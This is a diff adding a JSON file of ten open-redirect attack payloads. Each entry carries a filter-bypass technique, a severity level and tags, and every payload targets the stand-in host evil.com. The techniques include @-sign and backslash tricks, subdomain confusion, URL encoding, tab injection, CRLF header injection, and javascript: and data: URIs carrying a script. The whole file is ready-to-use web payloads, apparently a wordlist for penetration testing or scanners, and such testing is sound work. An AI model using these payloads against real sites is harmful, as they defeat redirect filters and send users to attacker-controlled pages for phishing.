@@ -1,0 +1,190 @@
+{
+    "category": "Open Redirect",
+    "description": "Open Redirect payloads for redirecting users to malicious sites",
+    "payloads": [
+        {
+            "id": "redirect-basic-001",
+            "title": "Basic HTTP",
+            "payload": "http://evil.com",
+            "category": "Open Redirect",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "redirect"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "http",
+                "redirect"
+            ],
+            "notes": "Basic open redirect",
+            "source": "github"
+        },
+        {
+            "id": "redirect-basic-002",
+            "title": "Double Slash",
+            "payload": "//evil.com",
+            "category": "Open Redirect",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "redirect"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "protocol",
+                "relative"
+            ],
+            "notes": "Protocol-relative URL",
+            "source": "github"
+        },
+        {
+            "id": "redirect-bypass-001",
+            "title": "Backslash Bypass",
+            "payload": "//evil.com\\@trusted.com",
+            "category": "Open Redirect",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "backslash",
+                "at"
+            ],
+            "notes": "Backslash with @ bypass",
+            "source": "github"
+        },
+        {
+            "id": "redirect-bypass-002",
+            "title": "Subdomain Trick",
+            "payload": "http://trusted.com.evil.com",
+            "category": "Open Redirect",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "subdomain",
+                "domain"
+            ],
+            "notes": "Trusted as subdomain of evil",
+            "source": "github"
+        },
+        {
+            "id": "redirect-bypass-003",
+            "title": "At Sign Bypass",
+            "payload": "http://trusted.com@evil.com",
+            "category": "Open Redirect",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "at",
+                "userinfo"
+            ],
+            "notes": "Treated as userinfo@host",
+            "source": "github"
+        },
+        {
+            "id": "redirect-bypass-004",
+            "title": "URL Encoding",
+            "payload": "http://evil%2Ecom",
+            "category": "Open Redirect",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "encoding",
+                "dot"
+            ],
+            "notes": "URL encoded dot",
+            "source": "github"
+        },
+        {
+            "id": "redirect-bypass-005",
+            "title": "Tab Injection",
+            "payload": "http://evil\t.com",
+            "category": "Open Redirect",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "tab",
+                "whitespace"
+            ],
+            "notes": "Tab character in domain",
+            "source": "github"
+        },
+        {
+            "id": "redirect-bypass-006",
+            "title": "CRLF Injection",
+            "payload": "/redirect?url=%0d%0aLocation:http://evil.com",
+            "category": "Open Redirect",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url",
+                "header"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "crlf",
+                "header"
+            ],
+            "notes": "CRLF header injection redirect",
+            "source": "github"
+        },
+        {
+            "id": "redirect-js-001",
+            "title": "JavaScript Redirect",
+            "payload": "javascript:location='http://evil.com'",
+            "category": "Open Redirect",
+            "subcategory": "JavaScript",
+            "context": [
+                "url",
+                "href"
+            ],
+            "level": "medium",
+            "tags": [
+                "javascript",
+                "location",
+                "redirect"
+            ],
+            "notes": "JavaScript protocol redirect",
+            "source": "github"
+        },
+        {
+            "id": "redirect-data-001",
+            "title": "Data URI Redirect",
+            "payload": "data:text/html,<script>location='http://evil.com'</script>",
+            "category": "Open Redirect",
+            "subcategory": "Data URI",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "data",
+                "uri",
+                "script"
+            ],
+            "notes": "Data URI with redirect script",
+            "source": "github"
+        }
+    ]
+}
